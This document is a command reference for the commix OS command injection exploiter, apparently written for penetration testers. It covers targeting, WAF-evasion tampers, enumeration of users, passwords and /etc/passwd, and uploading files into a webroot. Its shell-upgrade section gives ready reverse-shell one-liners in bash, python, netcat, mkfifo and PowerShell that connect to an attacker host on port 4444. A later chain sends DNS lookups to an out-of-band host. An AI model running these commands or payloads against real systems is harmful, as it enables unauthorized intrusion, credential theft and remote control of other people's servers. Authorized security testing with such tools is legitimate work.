# commix — Full Operating Reference

commix (COMMand Injection eXploiter) automates detection and exploitation of
OS command injection. Repo: commixproject/commix. Run `commix -h` /
`commix --help -v` to verify flags on your build.

## Target specification

```
commix -u "https://example.com/diag?addr=203.0.113.5"      # GET
commix -u "https://example.com/diag" --data="addr=1&go=1"  # POST
commix -r request.txt                                      # raw HTTP request file
commix -r request.txt --force-ssl                          # request file over HTTPS
commix -m targets.txt                                      # bulk target list
commix --url-reload                                        # re-GET page after each cmd (stateful apps)
```

Injection point selection:
- `-p addr` — test only this parameter (comma-separate for several).
- `--skip=debug,go` — skip parameters.
- Asterisk marker: put `*` in the URL/data/header where injection should go,
  e.g. `--data="addr=203.0.113.5*&go=1"` — commix injects only there.
- `--level=1|2|3` — 1 = GET/POST (default); 2 = + Cookie; 3 = + User-Agent,
  Referer, Host and other headers.
- Direct header injection: `--cookie='k=v*'`, `--user-agent='x*'`,
  `--referer='x*'`, `--headers="X-Api: val*"` (newline-separate multiples).

## Request shaping

```
--cookie="session=abc123; theme=dark"
--headers="X-Forwarded-For: 127.0.0.1\nX-Api-Version: 2"
--host=example.net            --referer=https://example.com/
--random-agent                --user-agent="Mozilla/5.0 ..."
--proxy=http://127.0.0.1:8080           # route through Burp/mitmproxy
--tor --tor-port=9050
--auth-type=basic|digest|bearer --auth-cred="user:pass"
--timeout=30 --retries=3 --delay=1
--ignore-code=500             # keep going past 500s
--ignore-redirects
```

## Techniques

`--technique=` (comma-combine; default tries all in order):

| Value | Class | Mechanism | When |
|---|---|---|---|
| `classic` | results-based | separator + `echo CANARY$((N+M))` reflected | output visible |
| `eval-based` | results-based | PHP `eval()`-style code-context injection | eval sinks |
| `time-based` | blind | `sleep`-driven, char-by-char inference | nothing reflected |
| `file-based` | semi-blind | write cmd output to a web-readable temp file, fetch it | slow time-based + writable webroot |

Tuning:
- `--time-sec=10` — blind delay baseline (raise on jittery links).
- `--web-root=/var/www/html/` and `--tmp-path=/tmp/` — for file-based.
- `--os=unix|windows` — pin target OS, skip wrong-OS payloads.
- `--prefix=";"` / `--suffix=" #"` — pin the known-good separator/comment from
  manual testing; drastically reduces requests and WAF noise.
- `--alter-shell=python` — build payloads via Python instead of the default
  shell wrappers (bypasses some bash-specific filters; needs python on target).

## Evasion

```
--tamper=space2ifs            # spaces -> ${IFS}
--tamper=space2plus,base64encode,randomcase   # chain, comma-separated
--encoding=url|hex|base64 (via tamper scripts)
--random-agent
```

List available tampers with `--list-tampers`.

## Automation & enumeration

```
--batch                 # answer all prompts with defaults — REQUIRED in pipelines
--answers="quit=n,continue=y"
--os-cmd="id"           # run one command, print, exit
--os-shell              # (default on success) interactive pseudo-shell
--all                   # enumerate everything below after detection
--current-user --hostname --is-root --is-admin
--sys-info --users --passwords --ps-version
--file-read=/etc/passwd
--file-write=local.php --file-dest=/var/www/html/x.php   # upload a file
-v 0..4                 # verbosity; -v 1 shows payloads sent
-s session.db           # explicit session file
--flush-session --ignore-session
--output-dir=/path      # default ~/.commix/output/<host>/ (logs.txt + session)
```

## Reading detection output

```
[info] Testing the (results-based) classic command injection technique.
(!) The parameter 'addr' seems injectable via (results-based) classic command injection technique.
    [~] Payload: ;echo UQQVZL$((61+40))$(echo UQQVZL)UQQVZL
```

Record for the finding: parameter name, technique string, the `Payload:` line,
and (from `-v 1` or your proxy) the full HTTP request/response pair. The same
lines land in `~/.commix/output/<host>/logs.txt` — this is what
`scripts/parse_cmdi.py --commix-dir` consumes.

False-positive check: for time-based results re-run with `--time-sec=5` then
`--time-sec=15` and confirm the delta tracks.

## Pseudo-shell and upgrade

At `commix(os_shell) >`:
- `?` — menu. `back` — re-select technique. `quit`.
- `reverse_tcp` — guided reverse shell: `set LHOST 198.51.100.7`,
  `set LPORT 4444`, choose netcat/python/php/perl/ruby payload. Have
  `nc -lvnp 4444` (or Metasploit `multi/handler`) listening first.
- `bind_tcp` — bind shell on the target.

Manual one-liners from the pseudo-shell when the wizard's payloads are
filtered:

```
bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("198.51.100.7",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
nc 198.51.100.7 4444 -e /bin/sh          # if -e supported
mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 198.51.100.7 4444 >/tmp/f
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('198.51.100.7',4444);..."   # Windows
```

File-based technique note: commix writes `<random>.txt` under `--web-root`;
clean up with `rm` from the shell when done, and record the artifact path in
the finding evidence.

## Typical chains

```
# Manual probe found %0a works, output blind, DNS egress confirmed:
commix -r request.txt --force-ssl --batch \
       --prefix="%0a" --technique=time-based --time-sec=8 \
       --os-cmd="nslookup c1.SESSION.oast.pro"

# Full auto against a Burp-exported request, then enumerate:
commix -r request.txt --force-ssl --batch --all -v 1

# Through Burp for full evidence capture:
commix -u "https://example.com/diag?addr=1" --batch --proxy=http://127.0.0.1:8080
```
